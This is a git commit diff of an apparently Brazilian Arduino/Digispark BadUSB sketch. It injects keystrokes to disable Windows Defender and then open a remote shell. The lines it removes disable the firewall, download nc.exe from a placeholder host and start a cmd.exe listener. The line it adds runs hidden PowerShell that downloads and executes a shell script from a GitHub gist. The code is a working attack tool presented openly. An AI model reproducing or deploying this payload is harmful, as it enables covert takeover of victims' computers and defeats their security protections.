9431f40f89179692ccf70722b8397264fc9cbf6d
Rogério Massouh <110058202+EndlssNightmare@users.noreply.github.com>
2023-07-18 19:00:28 -0300

    Update revshell-and-disablewindefender.ino

--- Revshell-and-DisableWindefender/revshell-and-disablewindefender.ino
+++ Revshell-and-DisableWindefender/revshell-and-disablewindefender.ino
@@ -5,7 +5,6 @@ void setup() {
   pinMode(0,OUTPUT); 
   pinMode(1,OUTPUT);     
 }
-
 void loop() {
   pisca_led(100);
   //Desliga o Windows Defender
@@ -16,7 +15,9 @@ void loop() {
   DigiKeyboard.delay(1500);
   DigiKeyboard.println("Windowsdefender://threat/");  //Abre o windows defender pelo executar
   DigiKeyboard.delay(1000);
-  DigiKeyboard.print("\t");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(2000);
+  //DigiKeyboard.print("\t");
   DigiKeyboard.delay(300);
   DigiKeyboard.print("\t");
   DigiKeyboard.delay(300);
@@ -37,24 +38,7 @@ void loop() {
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(2000);
   DigiKeyboard.sendKeyStroke(KEY_F4, MOD_ALT_LEFT);  //Fecha a janela
-  DigiKeyboard.delay(5000);
-    //Desabilita o Firewall
-  DigiKeyboard.sendKeyStroke(KEY_R,MOD_GUI_LEFT);  //Abre o executar
-  DigiKeyboard.delay(500);
-  DigiKeyboard.println("powershell start-process powershell -verb runas");  
-  DigiKeyboard.delay(2000);
-  DigiKeyboard.print("\t");
-  DigiKeyboard.delay(300);
-  DigiKeyboard.print("\t");
-  DigiKeyboard.delay(300);
-  DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  DigiKeyboard.delay(1000);
-  DigiKeyboard.println("powershell -windowstyle hidden Set-NetFirewallProfile -Enabled False");  //Desabilita o Firewall :)
-  DigiKeyboard.delay(300);
-  DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  DigiKeyboard.delay(500);
-  DigiKeyboard.sendKeyStroke(KEY_M, MOD_GUI_LEFT);  //Minimiza todas as janelas abertas
-  DigiKeyboard.delay(500);
+  DigiKeyboard.delay(200);
   //Reverse shell
   DigiKeyboard.sendKeyStroke(0);
   DigiKeyboard.delay(500);
@@ -63,20 +47,11 @@ void loop() {
   DigiKeyboard.print("powershell");
   DigiKeyboard.delay(500);
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  DigiKeyboard.delay(1000);
-  DigiKeyboard.println("powershell -windowstyle hidden Invoke-WebRequest -Uri http://YOURIP/nc.exe -OutFile test.exe");
-  DigiKeyboard.delay(1000);
-  DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(500);
-  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
-  DigiKeyboard.delay(500);
-  DigiKeyboard.print("powershell");
+  DigiKeyboard.println("powershell -windowstyle hidden \"IEX (New-Object Net.WebClient).DownloadString('https://gist.githubusercontent.com/EndlssNightmare/8e73f5ad18de63a997c15b8cff2c95e5/raw/c7981969c4281d8fa348d83d7f1bc504f2554599/shell.ps1');\"");
   DigiKeyboard.delay(500);
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  DigiKeyboard.delay(1000);
-  DigiKeyboard.println("powershell -windowstyle hidden ./test.exe -Lp 31337 -e cmd.exe");
-  DigiKeyboard.delay(1000);
-  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(500);
   //
   pisca_led(1000); 
   for(;;){ /*empty*/ } 
@@ -92,3 +67,4 @@ void pisca_led(int velocidade){
     DigiKeyboardPtBr.delay(velocidade);  
   } 
 }
+
